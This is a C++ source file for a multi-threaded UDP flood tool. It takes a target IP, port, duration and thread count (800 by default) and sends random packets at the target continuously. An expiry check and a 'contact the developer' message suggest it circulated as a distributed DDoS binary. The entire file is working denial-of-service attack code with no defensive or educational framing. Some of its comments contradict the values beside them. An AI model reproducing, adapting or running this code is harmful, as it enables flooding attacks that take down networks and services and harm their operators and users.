#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <vector>
#include <thread>
#include <mutex>
#include <sched.h>  // For setting CPU affinity

#define MAX_PACKET_SIZE 999999  // Maximum possible UDP packet size (including headers)
#define PAYLOAD_SIZE 1400     // Ideal payload size for UDP packets (leaving space for headers)

const int EXPIRY_DAY = 20;
const int EXPIRY_MONTH = 12;
const int EXPIRY_YEAR = 2024;

const int DEFAULT_THREAD_COUNT = 800;  // Set to 2 for 2-core system
;
std::mutex log_mutex;

// Function to generate a random payload for UDP packets
void generate_payload(char *buffer, size_t size) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < size; ++i) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

// Function to check if the binary has expired
bool is_binary_expired() {
    time_t now = time(nullptr);
    struct tm *current_time = localtime(&now);

    if ((current_time->tm_year + 1900 > EXPIRY_YEAR) ||
        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||
        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH &&
         current_time->tm_mday > EXPIRY_DAY)) {
        return true;
    }
    return false;
}

// Function to set CPU affinity for the current thread
void set_cpu_affinity(int thread_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(thread_id % 2, &cpuset);  // Pin threads to CPU cores (0 or 1)
    int result = pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    if (result != 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error setting CPU affinity." << std::endl;
    }
}

// Function for the UDP attack in each thread
void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id) {
    sockaddr_in server_addr{};
    char buffer[PAYLOAD_SIZE];  // Buffer for the UDP payload

    // Create a UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error: Unable to create socket. " << strerror(errno) << std::endl;
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cerr << "Thread " << thread_id << " - Error: Invalid IP address - " << ip << std::endl;
        close(sock);
        return;
    }

    generate_payload(buffer, PAYLOAD_SIZE);  // Generate the payload

    time_t start_time = time(nullptr);

    // Set CPU affinity for this thread (optional, improves performance)
    set_cpu_affinity(thread_id);

    while (time(nullptr) - start_time < attack_time) {
        ssize_t sent = sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent < 0) {
            std::lock_guard<std::mutex> lock(log_mutex);
            std::cerr << "Thread " << thread_id << " - Error: Failed to send packet. " << strerror(errno) << std::endl;
        }
    }

    close(sock);
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << "Thread " << thread_id << " completed its attack." << std::endl;
}

// Function to run the UDP attack in multiple threads
void multi_threaded_udp_attack(const char *ip, int port, int attack_time, int thread_count) {
    std::vector<std::thread> threads;

    std::cout << "LAUNCHING MULTI-THREADED UDP FLOOD ATTACK WITH " << thread_count << " threads..." << std::endl;

    // Create and start threads
    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(udp_attack_thread, ip, port, attack_time, i + 1);
    }

    // Wait for all threads to finish
    for (auto &thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }

    std::cout << "MULTI-THREADED ATTACK COMPLETED." << std::endl;
}

// Function to get the number of threads from the command line arguments or use a default value
int get_thread_count(int argc, char *argv[]) {
    if (argc == 5) {
        return std::stoi(argv[4]);  // Get thread count from argument if provided
    }
    return DEFAULT_THREAD_COUNT;  // Use default thread count (2) for 2-core system
}

int main(int argc, char *argv[]) {
    if (argc != 4 && argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <Time> [Threads]" << std::endl;
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int thread_count = get_thread_count(argc, argv);  // Determine thread count

    // Check if the binary has expired
    if (is_binary_expired()) {
        std::cerr << "ERROR: THIS BINARY HAS EXPIRED. PLEASE CONTACT THE DEVELOPER." << std::endl;
        return EXIT_FAILURE;
    }

    // Perform the multi-threaded attack
    multi_threaded_udp_attack(ip, port, duration, thread_count);

    return EXIT_SUCCESS;
}